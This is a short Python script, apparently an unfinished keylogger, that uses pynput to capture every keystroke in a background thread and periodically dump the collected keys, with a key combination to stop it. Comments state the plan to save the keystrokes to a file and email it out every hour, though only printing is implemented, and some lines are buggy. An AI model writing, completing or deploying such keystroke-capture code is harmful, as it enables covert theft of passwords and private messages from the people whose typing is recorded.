from pynput.keyboard import Key, Listener
from threading import *
from pynput import keyboard
import time
import sys

stopCombo = {keyboard.Key.alt_l, keyboard.Key.down}
current = set()
count = True;
keys = []

# Runs listener in seperate thread
class MyThread(Thread):
    def __init__(self, event):
        Thread.__init__(self)
        self.stopped = event
    def run(self):
        begin()

def begin():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Records then processes keys
def on_press(key):
    store(key)
    if key in stopCombo:
        current.add(key)
        if all(k in current for k in stopCombo):
            close()
            listener.stop()

def on_release(key):
    try:
        current.remove(key)
    except KeyError:
        pass

def store(key):
    keys.append(key)

def save():
    time.sleep(2) # 1 hour
    print(keys) # Save to file then email file

def close():
    global count
    count = False
    sys.exit()

stopFlag = Event()
thread = MyThread(stopFlag)
thread.start()

# Keeps a timer going to always back up keys to file
while count:
    print(count)
    save()
